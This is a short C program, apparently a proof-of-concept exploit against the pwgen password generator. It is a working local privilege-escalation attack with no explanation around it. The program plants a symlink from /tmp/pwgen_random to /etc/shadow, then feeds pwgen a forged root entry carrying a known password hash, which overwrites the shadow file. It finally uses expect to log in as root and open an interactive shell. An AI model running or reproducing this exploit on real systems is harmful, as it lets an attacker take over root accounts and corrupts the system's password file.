#include <stdio.h>
#include <stdlib.h>

#define FILENAME "/tmp/pwgen_random"

int main(int argc, char *argv[]) {
  FILE *fd;
  fd = popen("pwgen -e","w");
  unlink(FILENAME);
  symlink("/etc/shadow", FILENAME);
  fprintf(fd, ":::::::\nroot:00xQPHYlVDIw6:::::::");
  fclose(fd);
  system("expect -c 'spawn su root; expect \"Password:\"; send \"password\\r\"; interact'");
  return 0;
}
